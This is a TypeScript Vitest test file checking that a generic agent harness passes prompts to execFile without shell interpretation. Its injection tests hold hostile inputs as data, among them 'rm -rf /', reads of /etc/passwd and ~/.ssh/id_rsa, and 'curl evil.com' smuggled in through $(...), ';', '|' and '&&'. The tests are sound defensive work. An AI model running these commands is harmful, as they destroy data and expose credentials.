import { describe, expect, it, vi } from "vitest";

// Mock child_process.execFile
vi.mock("node:child_process", () => ({
	execFile: vi.fn((_cmd, _args, opts, cb) => {
		if (typeof opts === "function") {
			opts(null, "generic output", "");
		} else if (typeof cb === "function") {
			cb(null, "generic output", "");
		}
		return { pid: 5678, kill: vi.fn() };
	}),
}));

// Mock fs operations
vi.mock("node:fs/promises", async () => {
	const actual = await vi.importActual<typeof import("node:fs/promises")>("node:fs/promises");
	return {
		...actual,
		readdir: vi.fn().mockResolvedValue([]),
		lstat: vi.fn().mockRejectedValue(new Error("not found")),
	};
});

import { execFile } from "node:child_process";
import { GenericHarness, parseCommandTemplate } from "./generic.js";

const mockedExecFile = vi.mocked(execFile);

describe("parseCommandTemplate", () => {
	it("parses simple command", () => {
		const result = parseCommandTemplate("echo {prompt}");
		expect(result.cmd).toBe("echo");
		expect(result.argTemplate).toEqual(["{prompt}"]);
	});

	it("parses command with multiple args", () => {
		const result = parseCommandTemplate("my-agent --prompt {prompt} --verbose");
		expect(result.cmd).toBe("my-agent");
		expect(result.argTemplate).toEqual(["--prompt", "{prompt}", "--verbose"]);
	});

	it("throws on empty template", () => {
		expect(() => parseCommandTemplate("")).toThrow("Command template must not be empty");
	});

	it("handles extra whitespace", () => {
		const result = parseCommandTemplate("  echo   {prompt}  ");
		expect(result.cmd).toBe("echo");
		expect(result.argTemplate).toEqual(["{prompt}"]);
	});
});

describe("GenericHarness", () => {
	it("has correct name", () => {
		const harness = new GenericHarness();
		expect(harness.name).toBe("generic");
	});

	it("is always available", async () => {
		const harness = new GenericHarness();
		expect(await harness.available()).toBe(true);
	});

	it("uses default command template with execFile", async () => {
		mockedExecFile.mockClear();

		const harness = new GenericHarness();
		await harness.execute("Hello world", {
			workDir: "/tmp/test",
			timeout: 30,
		});

		// execFile should be called with cmd and args array, not a shell string
		const calledCmd = mockedExecFile.mock.calls[0][0] as string;
		const calledArgs = mockedExecFile.mock.calls[0][1] as string[];
		expect(calledCmd).toBe("echo");
		expect(calledArgs).toEqual(["Hello world"]);
	});

	it("uses custom command template", async () => {
		mockedExecFile.mockClear();

		const harness = new GenericHarness("codex exec --prompt {prompt}");
		await harness.execute("Create a file", {
			workDir: "/tmp/test",
			timeout: 30,
		});

		const calledCmd = mockedExecFile.mock.calls[0][0] as string;
		const calledArgs = mockedExecFile.mock.calls[0][1] as string[];
		expect(calledCmd).toBe("codex");
		expect(calledArgs).toEqual(["exec", "--prompt", "Create a file"]);
	});

	it("returns execution result", async () => {
		const harness = new GenericHarness();
		const result = await harness.execute("test", {
			workDir: "/tmp/test",
			timeout: 30,
		});

		expect(result.exitCode).toBe(0);
		expect(result.transcript).toBe("generic output");
		expect(result.duration).toBeGreaterThanOrEqual(0);
	});

	it("sets SKILLS_CHECK_PROMPT environment variable", async () => {
		mockedExecFile.mockClear();

		const harness = new GenericHarness();
		await harness.execute("my prompt value", {
			workDir: "/tmp/test",
			timeout: 30,
		});

		const calledOpts = mockedExecFile.mock.calls[0][2] as { env?: Record<string, string> };
		expect(calledOpts.env?.SKILLS_CHECK_PROMPT).toBe("my prompt value");
	});

	describe("command injection safety", () => {
		it("does not execute shell metacharacters via $(...)", async () => {
			mockedExecFile.mockClear();

			const harness = new GenericHarness();
			await harness.execute("$(rm -rf /)", {
				workDir: "/tmp/test",
				timeout: 30,
			});

			// The prompt is passed as a direct argument, not shell-interpolated
			const calledArgs = mockedExecFile.mock.calls[0][1] as string[];
			expect(calledArgs).toEqual(["$(rm -rf /)"]);
			// execFile does NOT pass through a shell, so this is a literal string
		});

		it("does not execute backtick injection", async () => {
			mockedExecFile.mockClear();

			const harness = new GenericHarness();
			await harness.execute("`whoami`", {
				workDir: "/tmp/test",
				timeout: 30,
			});

			const calledArgs = mockedExecFile.mock.calls[0][1] as string[];
			expect(calledArgs).toEqual(["`whoami`"]);
		});

		it("does not execute semicolon injection", async () => {
			mockedExecFile.mockClear();

			const harness = new GenericHarness();
			await harness.execute("hello; rm -rf /", {
				workDir: "/tmp/test",
				timeout: 30,
			});

			const calledArgs = mockedExecFile.mock.calls[0][1] as string[];
			expect(calledArgs).toEqual(["hello; rm -rf /"]);
		});

		it("does not execute pipe injection", async () => {
			mockedExecFile.mockClear();

			const harness = new GenericHarness();
			await harness.execute("hello | cat /etc/passwd", {
				workDir: "/tmp/test",
				timeout: 30,
			});

			const calledArgs = mockedExecFile.mock.calls[0][1] as string[];
			expect(calledArgs).toEqual(["hello | cat /etc/passwd"]);
		});

		it("does not execute && injection", async () => {
			mockedExecFile.mockClear();

			const harness = new GenericHarness();
			await harness.execute("hello && curl evil.com", {
				workDir: "/tmp/test",
				timeout: 30,
			});

			const calledArgs = mockedExecFile.mock.calls[0][1] as string[];
			expect(calledArgs).toEqual(["hello && curl evil.com"]);
		});

		it("handles prompt with single quotes safely", async () => {
			mockedExecFile.mockClear();

			const harness = new GenericHarness();
			await harness.execute("it's a test", {
				workDir: "/tmp/test",
				timeout: 30,
			});

			const calledArgs = mockedExecFile.mock.calls[0][1] as string[];
			expect(calledArgs).toEqual(["it's a test"]);
		});

		it("handles prompt with double quotes safely", async () => {
			mockedExecFile.mockClear();

			const harness = new GenericHarness();
			await harness.execute('say "hello"', {
				workDir: "/tmp/test",
				timeout: 30,
			});

			const calledArgs = mockedExecFile.mock.calls[0][1] as string[];
			expect(calledArgs).toEqual(['say "hello"']);
		});

		it("does not execute nested command substitution", async () => {
			mockedExecFile.mockClear();

			const harness = new GenericHarness();
			await harness.execute("$(echo $(whoami))", {
				workDir: "/tmp/test",
				timeout: 30,
			});

			const calledArgs = mockedExecFile.mock.calls[0][1] as string[];
			expect(calledArgs).toEqual(["$(echo $(whoami))"]);
		});

		it("does not expand environment variables via $HOME", async () => {
			mockedExecFile.mockClear();

			const harness = new GenericHarness();
			await harness.execute("cat $HOME/.ssh/id_rsa", {
				workDir: "/tmp/test",
				timeout: 30,
			});

			const calledArgs = mockedExecFile.mock.calls[0][1] as string[];
			expect(calledArgs).toEqual(["cat $HOME/.ssh/id_rsa"]);
		});

		// biome-ignore lint/suspicious/noTemplateCurlyInString: intentional literal shell variable for injection test
		it("does not expand environment variables via ${PATH}", async () => {
			mockedExecFile.mockClear();

			const harness = new GenericHarness();
			// biome-ignore lint/suspicious/noTemplateCurlyInString: intentional literal shell variable
			await harness.execute("echo ${PATH}", {
				workDir: "/tmp/test",
				timeout: 30,
			});

			const calledArgs = mockedExecFile.mock.calls[0][1] as string[];
			// biome-ignore lint/suspicious/noTemplateCurlyInString: intentional literal shell variable
			expect(calledArgs).toEqual(["echo ${PATH}"]);
		});

		it("handles newline injection safely", async () => {
			mockedExecFile.mockClear();

			const harness = new GenericHarness();
			await harness.execute("hello\nrm -rf /", {
				workDir: "/tmp/test",
				timeout: 30,
			});

			const calledArgs = mockedExecFile.mock.calls[0][1] as string[];
			expect(calledArgs).toEqual(["hello\nrm -rf /"]);
		});

		it("handles null byte injection safely", async () => {
			mockedExecFile.mockClear();

			const harness = new GenericHarness();
			await harness.execute("hello\x00evil", {
				workDir: "/tmp/test",
				timeout: 30,
			});

			const calledArgs = mockedExecFile.mock.calls[0][1] as string[];
			expect(calledArgs).toEqual(["hello\x00evil"]);
		});

		it("handles very long prompts without truncation", async () => {
			mockedExecFile.mockClear();

			const longPrompt = "A".repeat(10_240);
			const harness = new GenericHarness();
			await harness.execute(longPrompt, {
				workDir: "/tmp/test",
				timeout: 30,
			});

			const calledArgs = mockedExecFile.mock.calls[0][1] as string[];
			expect(calledArgs).toEqual([longPrompt]);
			expect(calledArgs[0].length).toBe(10_240);
		});

		it("handles unicode and emoji edge cases safely", async () => {
			mockedExecFile.mockClear();

			const unicodePrompt =
				"Create a file named \u{1F4A9}.txt with \u00FC\u00F1\u00EE\u00E7\u00F6\u00F0\u00E9 content \u200B\u200C\u200D";
			const harness = new GenericHarness();
			await harness.execute(unicodePrompt, {
				workDir: "/tmp/test",
				timeout: 30,
			});

			const calledArgs = mockedExecFile.mock.calls[0][1] as string[];
			expect(calledArgs).toEqual([unicodePrompt]);
		});

		it("passes SKILLS_CHECK_PROMPT unchanged for adversarial input", async () => {
			mockedExecFile.mockClear();

			// biome-ignore lint/suspicious/noTemplateCurlyInString: intentional literal shell variable for injection test
			const adversarial = "$(curl evil.com) && rm -rf / ; echo ${SECRET}";
			const harness = new GenericHarness();
			await harness.execute(adversarial, {
				workDir: "/tmp/test",
				timeout: 30,
			});

			const calledOpts = mockedExecFile.mock.calls[0][2] as { env?: Record<string, string> };
			expect(calledOpts.env?.SKILLS_CHECK_PROMPT).toBe(adversarial);
		});
	});
});
